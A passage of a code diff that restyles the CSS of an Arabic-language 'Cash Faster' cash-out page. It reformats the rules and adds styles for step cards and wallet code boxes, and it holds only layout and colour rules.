@@ -3,171 +3,870 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-<title>Cash Faster | الاستعلام الفوري عن طلب العميل</title>
+<title>Cash Faster | خطوات التسييل ورفع التأكيدات</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   :root {
-    --primary: #1A8C4A; --primary-light: #E8F5EE; --primary-dark: #0F6B38;
-    --gold: #B8912E; --gold-light: #FBF6E8; --gold-dark: #8E6F1F;
-    --bg: #F7F9FB; --bg-card: #FFFFFF; --bg-soft: #F0F4F8;
-    --text: #1A2332; --text-muted: #6B7A8F; --border: #E1E8F0;
+    --primary: #1A8C4A;
+    --primary-light: #E8F5EE;
+    --primary-dark: #0F6B38;
+    --gold: #B8912E;
+    --gold-light: #FBF6E8;
+    --gold-dark: #8E6F1F;
+    --bg: #F7F9FB;
+    --bg-card: #FFFFFF;
+    --bg-soft: #F0F4F8;
+    --text: #1A2332;
+    --text-muted: #6B7A8F;
+    --border: #E1E8F0;
     --shadow-sm: 0 2px 8px rgba(26,35,50,0.04);
+    --shadow: 0 8px 32px rgba(26,35,50,0.08);
     --shadow-lg: 0 16px 48px rgba(26,35,50,0.12);
-    --success: #16A34A; --success-light: #DCFCE7;
-    --info: #2563EB; --info-light: #DBEAFE;
-    --warning: #D97706; --warning-light: #FEF3C7;
-    --danger: #DC2626; --danger-light: #FEE2E2;
-    --purple: #7C3AED; --purple-light: #EDE9FE;
-    --etisalat-blue: #0284C7; --etisalat-light: #E0F2FE;
-    --vodafone-red: #E60000; --vodafone-light: #FEE2E2;
-    --review-color: #D97706; --invalid-color: #DC2626;
-    --pending-approval: #7C3AED; --pending-light: #EDE9FE;
-    --font: 'Cairo', sans-serif; --radius: 1.4rem; --radius-sm: 0.9rem;
+    --success: #16A34A;
+    --success-light: #DCFCE7;
+    --info: #2563EB;
+    --info-light: #DBEAFE;
+    --warning: #D97706;
+    --warning-light: #FEF3C7;
+    --danger: #DC2626;
+    --danger-light: #FEE2E2;
+    --etisalat-blue: #0284C7;
+    --etisalat-light: #E0F2FE;
+    --vodafone-red: #E60000;
+    --vodafone-light: #FEE2E2;
+    --purple: #7C3AED;
+    --purple-light: #EDE9FE;
+    --font: 'Cairo', sans-serif;
+    --radius: 1.4rem;
+    --radius-sm: 0.9rem;
   }
-  body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 1rem; position: relative; overflow-x: hidden; line-height: 1.7; }
-  .watermark { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; overflow: hidden; display: flex; align-items: center; justify-content: center; }
-  .watermark::before { content: 'CASH FASTER'; position: absolute; font-size: 9rem; font-weight: 900; color: rgba(26,140,74,0.045); letter-spacing: 0.3rem; transform: rotate(-32deg); white-space: nowrap; font-family: var(--font); }
-  .watermark::after { content: 'CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER'; position: absolute; font-size: 1.6rem; font-weight: 800; color: rgba(184,145,46,0.04); letter-spacing: 0.2rem; transform: rotate(-32deg); white-space: nowrap; line-height: 5rem; width: 200%; text-align: center; font-family: var(--font); }
-  .app-container { max-width: 480px; width: 100%; background: var(--bg-card); border-radius: 2rem; padding: 1.4rem 1.2rem; box-shadow: var(--shadow-lg); border: 1px solid var(--border); position: relative; z-index: 1; margin-bottom: 1rem; }
-  .promo-strip { background: linear-gradient(135deg, var(--primary-light), var(--gold-light)); border: 1px solid rgba(26,140,74,0.12); border-radius: 3rem; padding: 0.55rem 1.2rem; margin-bottom: 1.2rem; text-align: center; font-size: 0.72rem; color: var(--primary-dark); display: flex; align-items: center; justify-content: center; gap: 0.5rem; flex-wrap: wrap; font-weight: 600; }
+  body {
+    font-family: var(--font);
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 1rem;
+    position: relative;
+    overflow-x: hidden;
+    line-height: 1.7;
+  }
+
+  .watermark {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 0;
+    pointer-events: none;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .watermark::before {
+    content: 'CASH FASTER';
+    position: absolute;
+    font-size: 9rem;
+    font-weight: 900;
+    color: rgba(26,140,74,0.045);
+    letter-spacing: 0.3rem;
+    transform: rotate(-32deg);
+    white-space: nowrap;
+    font-family: var(--font);
+  }
+  .watermark::after {
+    content: 'CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER';
+    position: absolute;
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: rgba(184,145,46,0.04);
+    letter-spacing: 0.2rem;
+    transform: rotate(-32deg);
+    white-space: nowrap;
+    line-height: 5rem;
+    width: 200%;
+    text-align: center;
+    font-family: var(--font);
+  }
+
+  .app-container {
+    max-width: 520px;
+    width: 100%;
+    background: var(--bg-card);
+    border-radius: 2rem;
+    padding: 1.4rem 1.2rem;
+    box-shadow: var(--shadow-lg);
+    border: 1px solid var(--border);
+    position: relative;
+    z-index: 1;
+    margin-bottom: 1rem;
+  }
+
+  .promo-strip {
+    background: linear-gradient(135deg, var(--primary-light), var(--gold-light));
+    border: 1px solid rgba(26,140,74,0.12);
+    border-radius: 3rem;
+    padding: 0.55rem 1.2rem;
+    margin-bottom: 1.2rem;
+    text-align: center;
+    font-size: 0.72rem;
+    color: var(--primary-dark);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    font-weight: 600;
+  }
   .promo-strip i { color: var(--primary); }
   .promo-strip .highlight { color: var(--gold-dark); font-weight: 800; }
-  .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding-bottom: 1rem;
+    border-bottom: 1px solid var(--border);
+  }
   .brand { display: flex; align-items: center; gap: 0.7rem; cursor: pointer; }
-  .brand .icon { width: 48px; height: 48px; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); border-radius: 14px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: #FFFFFF; box-shadow: 0 6px 20px rgba(26,140,74,0.25); }
-  .brand h1 { font-size: 1.4rem; font-weight: 900; color: var(--text); letter-spacing: 0.3px; line-height: 1.2; }
-  .brand h1 span { color: var(--gold); display: block; font-size: 0.7rem; letter-spacing: 2px; font-weight: 700; margin-top: 1px; }
-  .header .badge { background: var(--success-light); border: 1px solid rgba(22,163,74,0.2); border-radius: 3rem; padding: 0.35rem 0.9rem; font-size: 0.65rem; color: var(--success); display: flex; align-items: center; gap: 0.4rem; font-weight: 700; }
+  .brand .icon {
+    width: 48px; height: 48px;
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.5rem;
+    color: #FFFFFF;
+    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
+  }
+  .brand h1 {
+    font-size: 1.4rem;
+    font-weight: 900;
+    color: var(--text);
+    letter-spacing: 0.3px;
+    line-height: 1.2;
+  }
+  .brand h1 span {
+    color: var(--gold);
+    display: block;
+    font-size: 0.7rem;
+    letter-spacing: 2px;
+    font-weight: 700;
+    margin-top: 1px;
+  }
+  .header .badge {
+    background: var(--success-light);
+    border: 1px solid rgba(22,163,74,0.2);
+    border-radius: 3rem;
+    padding: 0.35rem 0.9rem;
+    font-size: 0.65rem;
+    color: var(--success);
+    display: flex;
+    align-items: center;
+    gap: 0.4rem;
+    font-weight: 700;
+  }
   .header .badge i { font-size: 0.45rem; animation: dotPulse 1.8s ease-in-out infinite; }
   @keyframes dotPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-  .nav-tabs { display: flex; gap: 0.4rem; margin: 1.1rem 0; background: var(--bg-soft); border-radius: 3rem; padding: 0.35rem; }
-  .nav-tabs .tab { flex: 1; text-align: center; padding: 0.55rem 0.3rem; border-radius: 3rem; font-size: 0.65rem; font-weight: 700; color: var(--text-muted); display: flex; align-items: center; justify-content: center; gap: 0.35rem; }
-  .nav-tabs .tab.active { background: var(--bg-card); color: var(--primary-dark); box-shadow: var(--shadow-sm); }
-  .search-box { display: flex; gap: 0.6rem; margin: 0.9rem 0 1.3rem 0; }
-  .search-box input { flex: 1; padding: 0.95rem 1.2rem; border-radius: 3rem; border: 2px solid var(--border); background: var(--bg-soft); color: var(--text); font-size: 0.95rem; text-align: center; font-family: var(--font); font-weight: 600; letter-spacing: 1px; }
-  .search-box input:focus { outline: none; border-color: var(--primary); background: #FFFFFF; box-shadow: 0 0 0 4px rgba(26,140,74,0.1); }
-  .search-box button { padding: 0.95rem 1.6rem; border: none; border-radius: 3rem; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #FFFFFF; font-weight: 800; cursor: pointer; font-family: var(--font); font-size: 0.9rem; display: flex; align-items: center; gap: 0.5rem; box-shadow: 0 6px 20px rgba(26,140,74,0.25); white-space: nowrap; }
-  .loan-card { background: linear-gradient(145deg, #FFFFFF, #FAFCFE); border-radius: var(--radius); padding: 1.5rem 1.2rem; border: 1px solid var(--border); margin-bottom: 1rem; box-shadow: var(--shadow-sm); }
-  .loan-card .loan-label { font-size: 0.7rem; color: var(--text-muted); letter-spacing: 1.5px; text-align: center; font-weight: 700; }
-  .loan-card .loan-amount-main { text-align: center; font-size: 2.8rem; font-weight: 900; color: var(--primary-dark); margin: 0.3rem 0; line-height: 1.1; }
-  .loan-card .loan-amount-main .currency { font-size: 1.2rem; color: var(--text-muted); font-weight: 700; }
-  .loan-card .loan-percent { text-align: center; font-size: 0.85rem; color: var(--success); font-weight: 800; margin-bottom: 0.8rem; }
-  .loan-details-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.6rem; margin-top: 1rem; padding-top: 1rem; border-top: 1px dashed var(--border); }
-  .loan-details-grid .detail-item { text-align: center; background: var(--bg-soft); border-radius: var(--radius-sm); padding: 0.6rem 0.3rem; }
-  .loan-details-grid .detail-item .label { font-size: 0.55rem; color: var(--text-muted); font-weight: 700; }
-  .loan-details-grid .detail-item .value { font-size: 0.88rem; font-weight: 800; color: var(--text); margin-top: 0.2rem; }
+
+  .nav-tabs {
+    display: flex;
+    gap: 0.4rem;
+    margin: 1.1rem 0;
+    background: var(--bg-soft);
+    border-radius: 3rem;
+    padding: 0.35rem;
+  }
+  .nav-tabs .tab {
+    flex: 1;
+    text-align: center;
+    padding: 0.55rem 0.3rem;
+    border-radius: 3rem;
+    font-size: 0.65rem;
+    font-weight: 700;
+    color: var(--text-muted);
+    transition: 0.25s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.35rem;
+  }
+  .nav-tabs .tab.active {
+    background: var(--bg-card);
+    color: var(--primary-dark);
+    box-shadow: var(--shadow-sm);
+  }
+
+  /* ===== صندوق البحث ===== */
+  .search-box {
+    display: flex;
+    gap: 0.6rem;
+    margin: 0.9rem 0 1.3rem 0;
+  }
+  .search-box input {
+    flex: 1;
+    padding: 0.95rem 1.2rem;
+    border-radius: 3rem;
+    border: 2px solid var(--border);
+    background: var(--bg-soft);
+    color: var(--text);
+    font-size: 0.95rem;
+    text-align: center;
+    transition: 0.25s;
+    font-family: var(--font);
+    font-weight: 600;
+    letter-spacing: 1px;
+  }
+  .search-box input:focus {
+    outline: none;
+    border-color: var(--primary);
+    background: #FFFFFF;
+    box-shadow: 0 0 0 4px rgba(26,140,74,0.1);
+  }
+  .search-box input::placeholder {
+    color: var(--text-muted);
+    font-weight: 400;
+    letter-spacing: 0;
+  }
+  .search-box button {
+    padding: 0.95rem 1.6rem;
+    border: none;
+    border-radius: 3rem;
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    color: #FFFFFF;
+    font-weight: 800;
+    cursor: pointer;
+    transition: 0.25s;
+    font-family: var(--font);
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
+    white-space: nowrap;
+  }
+  .search-box button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 28px rgba(26,140,74,0.35);
+  }
+
+  .loan-card {
+    background: linear-gradient(145deg, #FFFFFF, #FAFCFE);
+    border-radius: var(--radius);
+    padding: 1.5rem 1.2rem;
+    border: 1px solid var(--border);
+    margin-bottom: 1rem;
+    position: relative;
+    overflow: hidden;
+    box-shadow: var(--shadow-sm);
+  }
+  .loan-card::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 120px; height: 120px;
+    background: radial-gradient(circle, rgba(184,145,46,0.08), transparent 70%);
+    pointer-events: none;
+  }
+  .loan-card .loan-label {
+    font-size: 0.7rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    text-align: center;
+    font-weight: 700;
+  }
+  .loan-card .loan-amount-main {
+    text-align: center;
+    font-size: 2.8rem;
+    font-weight: 900;
+    color: var(--primary-dark);
+    margin: 0.3rem 0;
+    letter-spacing: 1px;
+    line-height: 1.1;
+  }
+  .loan-card .loan-amount-main .currency {
+    font-size: 1.2rem;
+    color: var(--text-muted);
+    font-weight: 700;
+  }
+  .loan-card .loan-percent {
+    text-align: center;
+    font-size: 0.85rem;
+    color: var(--success);
+    font-weight: 800;
+    margin-bottom: 0.8rem;
+  }
+  .loan-card .loan-percent i { margin-left: 0.4rem; }
+
+  .loan-details-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 0.6rem;
+    margin-top: 1rem;
+    padding-top: 1rem;
+    border-top: 1px dashed var(--border);
+  }
+  .loan-details-grid .detail-item {
+    text-align: center;
+    background: var(--bg-soft);
+    border-radius: var(--radius-sm);
+    padding: 0.6rem 0.3rem;
+    transition: 0.2s;
+  }
+  .loan-details-grid .detail-item:hover { background: var(--primary-light); }
+  .loan-details-grid .detail-item .label {
+    font-size: 0.55rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    font-weight: 700;
+  }
+  .loan-details-grid .detail-item .value {
+    font-size: 0.88rem;
+    font-weight: 800;
+    color: var(--text);
+    margin-top: 0.2rem;
+  }
   .loan-details-grid .detail-item .value.gold { color: var(--gold-dark); }
   .loan-details-grid .detail-item .value.green { color: var(--success); }
-  .loan-details-grid .detail-item .value.vodafone { color: var(--danger); }
-  .loan-details-grid .detail-item .value.warning { color: var(--warning); }
-  .status-bar { display: flex; align-items: center; gap: 0.8rem; background: var(--bg-card); border-radius: var(--radius); padding: 0.9rem 1.1rem; border: 1px solid var(--border); margin: 0.9rem 0; box-shadow: var(--shadow-sm); }
-  .status-bar .status-icon { width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1rem; flex-shrink: 0; }
+
+  .status-bar {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    background: var(--bg-card);
+    border-radius: var(--radius);
+    padding: 0.9rem 1.1rem;
+    border: 1px solid var(--border);
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+  }
+  .status-bar .status-icon {
+    width: 42px; height: 42px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1rem;
+    flex-shrink: 0;
+  }
   .status-bar .status-text { flex: 1; }
   .status-bar .status-text .main { font-weight: 800; font-size: 0.9rem; line-height: 1.3; }
   .status-bar .status-text .sub { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.15rem; }
-  .status-bar .status-badge { border-radius: 3rem; padding: 0.2rem 0.7rem; font-size: 0.6rem; font-weight: 700; }
-  .status-bar.approved { border-color: rgba(22,163,74,0.25); background: linear-gradient(135deg, #FFFFFF, var(--success-light)); }
-  .status-bar.approved .status-icon { background: var(--success-light); color: var(--success); }
-  .status-bar.approved .status-text .main { color: var(--success); }
-  .status-bar.approved .status-badge { background: var(--success-light); border: 1px solid rgba(22,163,74,0.25); color: var(--success); }
-  .status-bar.review { border-color: rgba(217,119,6,0.25); background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); }
-  .status-bar.review .status-icon { background: var(--warning-light); color: var(--warning); }
-  .status-bar.review .status-text .main { color: var(--warning); }
-  .status-bar.review .status-badge { background: var(--warning-light); border: 1px solid rgba(217,119,6,0.25); color: var(--warning); }
-  .status-bar.rejected { border-color: rgba(220,38,38,0.25); background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); }
-  .status-bar.rejected .status-icon { background: var(--danger-light); color: var(--danger); }
-  .status-bar.rejected .status-text .main { color: var(--danger); }
-  .status-bar.rejected .status-badge { background: var(--danger-light); border: 1px solid rgba(220,38,38,0.25); color: var(--danger); }
-  .status-bar.invalid { border-color: rgba(220,38,38,0.25); background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); }
-  .status-bar.invalid .status-icon { background: var(--danger-light); color: var(--invalid-color); }
-  .status-bar.invalid .status-text .main { color: var(--invalid-color); }
-  .status-bar.invalid .status-badge { background: var(--danger-light); border: 1px solid rgba(220,38,38,0.25); color: var(--invalid-color); }
-  .status-bar.pending-approval { border-color: rgba(124,58,237,0.25); background: linear-gradient(135deg, #FFFFFF, var(--pending-light)); }
-  .status-bar.pending-approval .status-icon { background: var(--pending-light); color: var(--pending-approval); }
-  .status-bar.pending-approval .status-text .main { color: var(--pending-approval); }
-  .status-bar.pending-approval .status-badge { background: var(--pending-light); border: 1px solid rgba(124,58,237,0.25); color: var(--pending-approval); }
-  .client-info { background: var(--bg-card); border-radius: var(--radius); padding: 1rem 1.2rem; border: 1px solid var(--border); margin: 0.9rem 0; box-shadow: var(--shadow-sm); }
-  .client-info .info-title { font-size: 0.75rem; font-weight: 800; color: var(--text-muted); margin-bottom: 0.6rem; display: flex; align-items: center; gap: 0.5rem; }
+  .status-bar.info { border-color: rgba(37,99,235,0.25); background: linear-gradient(135deg, #FFFFFF, var(--info-light)); }
+  .status-bar.info .status-icon { background: var(--info-light); color: var(--info); }
+  .status-bar.info .status-text .main { color: var(--info); }
+  .status-bar.warning { border-color: rgba(217,119,6,0.25); background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); }
+  .status-bar.warning .status-icon { background: var(--warning-light); color: var(--warning); }
+  .status-bar.warning .status-text .main { color: var(--warning); }
+
+  .client-info {
+    background: var(--bg-card);
+    border-radius: var(--radius);
+    padding: 1rem 1.2rem;
+    border: 1px solid var(--border);
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+  }
+  .client-info .info-title {
+    font-size: 0.75rem;
+    font-weight: 800;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 0.6rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
   .client-info .info-title i { color: var(--primary); }
-  .client-info .row { display: flex; justify-content: space-between; padding: 0.55rem 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; gap: 0.5rem; }
+  .client-info .row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0.55rem 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 0.85rem;
+    gap: 0.5rem;
+  }
   .client-info .row:last-child { border-bottom: none; }
   .client-info .row .key { color: var(--text-muted); font-weight: 600; flex-shrink: 0; }
   .client-info .row .value { font-weight: 700; text-align: left; color: var(--text); word-break: break-word; }
   .client-info .row .value.gold { color: var(--gold-dark); }
   .client-info .row .value.green { color: var(--success); }
-  .client-info .row .value.vodafone { color: var(--danger); }
-  .client-info .row .value.review { color: var(--review-color); }
-  .client-info .row .value.pending-approval { color: var(--pending-approval); }
-  .id-verification { background: linear-gradient(135deg, #FFFFFF, var(--gold-light)); border: 2px solid var(--gold); border-radius: var(--radius); padding: 1.1rem; margin: 0.9rem 0; }
-  .id-verification .idv-header { display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.8rem; padding-bottom: 0.6rem; border-bottom: 1px solid rgba(184,145,46,0.2); }
-  .id-verification .idv-header .idv-icon { width: 38px; height: 38px; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #FFFFFF; font-size: 1rem; flex-shrink: 0; }
-  .id-verification .idv-header h4 { font-size: 0.9rem; font-weight: 800; color: var(--gold-dark); }
+
+  .id-verification {
+    background: linear-gradient(135deg, #FFFFFF, var(--gold-light));
+    border: 2px solid var(--gold);
+    border-radius: var(--radius);
+    padding: 1.1rem;
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+  }
+  .id-verification .idv-header {
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    margin-bottom: 0.8rem;
+    padding-bottom: 0.6rem;
+    border-bottom: 1px solid rgba(184,145,46,0.2);
+  }
+  .id-verification .idv-header .idv-icon {
+    width: 38px; height: 38px;
+    background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #FFFFFF;
+    font-size: 1rem;
+    flex-shrink: 0;
+  }
+  .id-verification .idv-header h4 { font-size: 0.9rem; font-weight: 800; color: var(--gold-dark); line-height: 1.3; }
   .id-verification .idv-header p { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.1rem; }
-  .id-verification .idv-image-box { background: #FFFFFF; border: 1px dashed var(--gold); border-radius: var(--radius-sm); padding: 0.6rem; text-align: center; overflow: hidden; }
-  .id-verification .idv-image-box img { max-width: 100%; height: auto; border-radius: 0.6rem; display: block; margin: 0 auto; max-height: 320px; object-fit: contain; }
-  .id-verification .idv-image-box .idv-placeholder { padding: 1.5rem 0.5rem; color: var(--text-muted); font-size: 0.78rem; font-weight: 600; }
-  .id-verification .idv-caption { font-size: 0.68rem; color: var(--text-muted); text-align: center; margin-top: 0.5rem; font-weight: 600; }
-  .status-message-box { border-radius: var(--radius); padding: 1.1rem; margin: 0.9rem 0; text-align: center; }
-  .status-message-box .status-icon { font-size: 2.5rem; display: block; margin-bottom: 0.5rem; }
-  .status-message-box h3 { font-size: 1.05rem; font-weight: 800; margin-bottom: 0.3rem; }
-  .status-message-box p { font-size: 0.82rem; line-height: 1.9; color: var(--text-muted); }
-  .status-message-box.approved { background: linear-gradient(135deg, #FFFFFF, var(--success-light)); border: 2px solid var(--success); }
-  .status-message-box.approved h3 { color: var(--success); }
-  .status-message-box.review { background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); border: 2px solid var(--warning); }
-  .status-message-box.review h3 { color: var(--warning); }
-  .status-message-box.rejected { background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); border: 2px solid var(--danger); }
-  .status-message-box.rejected h3 { color: var(--danger); }
-  .status-message-box.invalid { background: linear-gradient(135deg, #FFFFFF, var(--danger-light)); border: 2px solid var(--invalid-color); }
-  .status-message-box.invalid h3 { color: var(--invalid-color); }
-  .status-message-box.pending-approval { background: linear-gradient(135deg, #FFFFFF, var(--pending-light)); border: 2px solid var(--pending-approval); }
-  .status-message-box.pending-approval h3 { color: var(--pending-approval); }
-  .wallet-notice { border-radius: var(--radius); padding: 1.1rem; margin: 0.9rem 0; }
-  .wallet-notice .notice-head { display: flex; align-items: center; gap: 0.7rem; margin-bottom: 0.5rem; }
-  .wallet-notice .notice-head i { font-size: 1.6rem; flex-shrink: 0; }
-  .wallet-notice .notice-head h4 { font-size: 0.9rem; font-weight: 800; }
-  .wallet-notice p { color: var(--text-muted); font-size: 0.78rem; line-height: 1.9; }
-  .wallet-notice.etisalat { background: linear-gradient(135deg, #FFFFFF, var(--etisalat-light)); border: 2px solid var(--etisalat-blue); }
-  .wallet-notice.etisalat .notice-head i, .wallet-notice.etisalat .notice-head h4 { color: var(--etisalat-blue); }
-  .wallet-notice.vodafone { background: linear-gradient(135deg, #FFFFFF, var(--vodafone-light)); border: 2px solid var(--vodafone-red); }
-  .wallet-notice.vodafone .notice-head i, .wallet-notice.vodafone .notice-head h4 { color: var(--vodafone-red); }
-  .wallet-notice.none { background: linear-gradient(135deg, #FFFFFF, var(--gold-light)); border: 2px solid var(--gold); }
-  .wallet-notice.none .notice-head i, .wallet-notice.none .notice-head h4 { color: var(--gold-dark); }
-  .btn-whatsapp-transfer { width: 100%; padding: 1rem 1.2rem; border: none; border-radius: 3rem; background: linear-gradient(135deg, #25D366, #128C7E); color: #FFFFFF; font-weight: 800; font-size: 0.95rem; display: flex; align-items: center; justify-content: center; gap: 0.7rem; cursor: pointer; box-shadow: 0 8px 28px rgba(37,211,102,0.3); margin-top: 0.8rem; font-family: var(--font); animation: pulseWhatsApp 2s ease-in-out infinite; }
-  @keyframes pulseWhatsApp { 0%,100% { box-shadow: 0 8px 28px rgba(37,211,102,0.3); transform: scale(1); } 50% { box-shadow: 0 8px 42px rgba(37,211,102,0.5); transform: scale(1.015); } }
-  .btn-whatsapp-transfer i { font-size: 1.3rem; }
-  .btn-whatsapp-transfer .badge-new { background: rgba(255,255,255,0.22); border-radius: 3rem; padding: 0.1rem 0.6rem; font-size: 0.6rem; font-weight: 800; }
-  .btn-whatsapp-transfer.etisalat-btn { background: linear-gradient(135deg, #0284C7, #0369A1); }
-  .btn-whatsapp-transfer.vodafone-btn { background: linear-gradient(135deg, #E60000, #B30000); }
-  .btn-whatsapp-transfer.gold-btn { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #FFFFFF; }
-  .error-box { background: var(--danger-light); border: 1px solid rgba(220,38,38,0.2); border-radius: var(--radius); padding: 1.2rem; text-align: center; color: var(--danger); font-size: 0.85rem; display: none; margin-top: 0.8rem; font-weight: 600; line-height: 1.8; }
+  .id-verification .idv-image-box {
+    background: #FFFFFF;
+    border: 1px dashed var(--gold);
+    border-radius: var(--radius-sm);
+    padding: 0.6rem;
+    text-align: center;
+    overflow: hidden;
+  }
+  .id-verification .idv-image-box img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 0.6rem;
+    display: block;
+    margin: 0 auto;
+    max-height: 320px;
+    object-fit: contain;
+  }
+  .id-verification .idv-image-box .idv-placeholder {
+    padding: 1.5rem 0.5rem;
+    color: var(--text-muted);
+    font-size: 0.78rem;
+    font-weight: 600;
+  }
+  .id-verification .idv-image-box .idv-placeholder i {
+    font-size: 2rem;
+    color: var(--gold);
+    display: block;
+    margin-bottom: 0.4rem;
+  }
+  .id-verification .idv-caption {
+    font-size: 0.68rem;
+    color: var(--text-muted);
+    text-align: center;
+    margin-top: 0.5rem;
+    font-weight: 600;
+  }
+
+  .steps-container {
+    background: var(--bg-card);
+    border-radius: var(--radius);
+    padding: 1.3rem 1.1rem;
+    border: 1px solid var(--border);
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+  }
+  .steps-container .steps-header {
+    display: flex;
+    align-items: center;
+    gap: 0.7rem;
+    margin-bottom: 1rem;
+    padding-bottom: 0.8rem;
+    border-bottom: 2px solid var(--primary-light);
+  }
+  .steps-container .steps-header .icon {
+    width: 42px; height: 42px;
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #FFFFFF;
+    font-size: 1.1rem;
+    flex-shrink: 0;
+  }
+  .steps-container .steps-header h3 { font-size: 1rem; font-weight: 800; color: var(--text); line-height: 1.3; }
+  .steps-container .steps-header p { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.1rem; }
+
+  .code-box {
+    background: linear-gradient(135deg, var(--gold-light), #FFFDF7);
+    border: 2px dashed var(--gold);
+    border-radius: var(--radius-sm);
+    padding: 0.9rem;
+    margin: 0.8rem 0;
+    text-align: center;
+  }
+  .code-box .code-label {
+    font-size: 0.65rem;
+    color: var(--gold-dark);
+    font-weight: 700;
+    margin-bottom: 0.35rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .code-box .code-value {
+    font-size: 1.6rem;
+    font-weight: 900;
+    color: var(--gold-dark);
+    font-family: 'Courier New', monospace;
+    direction: ltr;
+    letter-spacing: 2px;
+  }
+  .code-box .code-hint { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.3rem; }
+
+  /* ===== صندوق كود فودافون ===== */
+  .code-box.vodafone {
+    background: linear-gradient(135deg, var(--vodafone-light), #FFF5F5);
+    border-color: var(--vodafone-red);
+  }
+  .code-box.vodafone .code-label { color: var(--vodafone-red); }
+  .code-box.vodafone .code-value { color: var(--vodafone-red); }
+
+  .step-cards { display: flex; flex-direction: column; gap: 0.7rem; margin: 0.9rem 0; }
+  .step-cards .step-card {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.8rem;
+    padding: 0.9rem 1rem;
+    background: linear-gradient(135deg, #FFFFFF, var(--bg-soft));
+    border: 1.5px solid var(--border);
+    border-radius: var(--radius-sm);
+    transition: 0.25s;
+    position: relative;
+    overflow: hidden;
+  }
+  .step-cards .step-card::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 4px;
+    height: 100%;
+    background: linear-gradient(180deg, var(--primary), var(--primary-dark));
+    transition: 0.25s;
+  }
+  .step-cards .step-card:hover {
+    border-color: var(--primary);
+    box-shadow: 0 4px 16px rgba(26,140,74,0.1);
+    transform: translateX(-2px);
+  }
+  .step-cards .step-card .step-num {
+    min-width: 40px;
+    height: 40px;
